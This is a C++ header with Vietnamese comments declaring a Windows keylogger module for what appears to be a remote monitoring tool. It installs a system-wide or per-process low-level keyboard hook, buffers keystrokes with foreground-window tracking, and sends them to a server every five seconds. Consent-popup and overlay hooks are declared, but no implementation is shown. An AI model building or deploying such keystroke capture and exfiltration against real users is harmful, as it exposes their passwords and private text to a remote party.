#ifndef MODULE_KEYLOGGER_H
#define MODULE_KEYLOGGER_H

#include <windows.h>
#include <string>
#include <mutex>
#include <thread>
#include <atomic>
#include <functional>
#include <nlohmann/json.hpp>

// Tích hợp Consent & OverlayDot nhất quán với các module khác
#include "Consent.h"
#include "OverlayDot.h"

using json = nlohmann::json;

// Callback dùng để gửi log JSON về server (tương tự pattern của các module khác)
using KeyloggerCallback = std::function<void(const std::string& jsonPayload)>;

// ============================================================
// ModuleKeylogger
//
// Chức năng:
//   - Cài hook WH_KEYBOARD_LL trên một luồng riêng có Message Pump
//   - Map mã VK sang chuỗi đọc được
//   - Buffer log thread-safe với FlushLog() cho Network client
//   - Yêu cầu sự đồng ý của người dùng trước khi bắt đầu
//   - Tự động flush về server mỗi AUTO_FLUSH_INTERVAL_SEC giây
// ============================================================
class ModuleKeylogger {
public:
    ModuleKeylogger();
    ~ModuleKeylogger();

    // ---------------------------------------------------------
    // API chính
    // ---------------------------------------------------------

    // Bắt đầu ghi bàn phím. pid = 0 -> toàn hệ thống.
    // callback: hàm được gọi mỗi khi có log mới gửi về server.
    json StartLogging(DWORD pid, KeyloggerCallback callback);

    // Dừng ghi bàn phím, flush lần cuối rồi trả về kết quả.
    json StopLogging();

    // Lấy toàn bộ log trong buffer rồi xóa (thread-safe).
    // Network client có thể gọi hàm này thủ công theo yêu cầu "flush".
    json FlushLog();

    bool IsRunning() const { return m_isRunning.load(); }

    // ---------------------------------------------------------
    // Hook callback - phải là static public để truyền vào
    // SetWindowsHookEx
    // ---------------------------------------------------------
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

private:
    // --- Helpers ---
    bool        RequestUserConsent(DWORD pid);      // Popup xin phép người dùng
    void        HookThreadWorker();                 // Message pump + hook, chạy trên luồng riêng
    void        AutoFlushWorker();                  // Flush định kỳ về server
    void        AppendToLog(const std::string& text); // Ghi vào buffer (thread-safe)

    // Chuyển mã Virtual-Key sang chuỗi đọc được (layout US QWERTY)
    static std::string VkToString(DWORD vkCode, bool shiftPressed, bool capsActive);

    // --- Hook state (static vì callback là static) ---
    static HHOOK            s_hHook;
    static ModuleKeylogger* s_instance; // Singleton - chỉ chạy 1 instance tại một thời điểm

    // --- Luồng ---
    std::thread             m_hookThread;
    std::thread             m_flushThread;
    std::atomic<bool>       m_isRunning;
    std::atomic<DWORD>      m_hookThreadId; // Để PostThreadMessage(WM_QUIT) dừng message pump

    // --- Lọc theo process ---
    DWORD                   m_targetPid;    // 0 = log tất cả

    // --- Buffer log thread-safe ---
    std::mutex              m_logMutex;
    std::string             m_logBuffer;

    // --- Callback gửi về server ---
    KeyloggerCallback       m_callback;

    // --- Tracking thay đổi cửa sổ ---
    HWND                    m_lastForeground;

    // Tự động flush mỗi N giây khi keylogger đang chạy
    static constexpr int    AUTO_FLUSH_INTERVAL_SEC = 5;
};

#endif // MODULE_KEYLOGGER_H
